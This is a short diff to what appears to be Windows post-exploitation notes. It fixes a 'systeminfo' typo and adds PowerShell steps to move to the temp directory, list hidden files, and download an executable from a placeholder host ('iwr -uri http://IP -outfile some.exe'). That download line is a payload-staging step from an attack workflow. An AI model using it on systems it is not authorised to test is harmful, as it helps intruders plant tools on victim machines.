@@ -17,12 +17,20 @@ Basic Strategy
 * look for internal ports
 * Check users
 
-### System
+### Basic stuff to do first
 
 ```powershell
 
-sysminfo
+# get into temp dir which is typically writable
+cd $env:temp
 
+systeminfo
+
+# see also hidden files
+Get-ChildItem . -Force
+
+# download stuff if needed
+iwr -uri http://IP -outfile some.exe
 
 ```
 
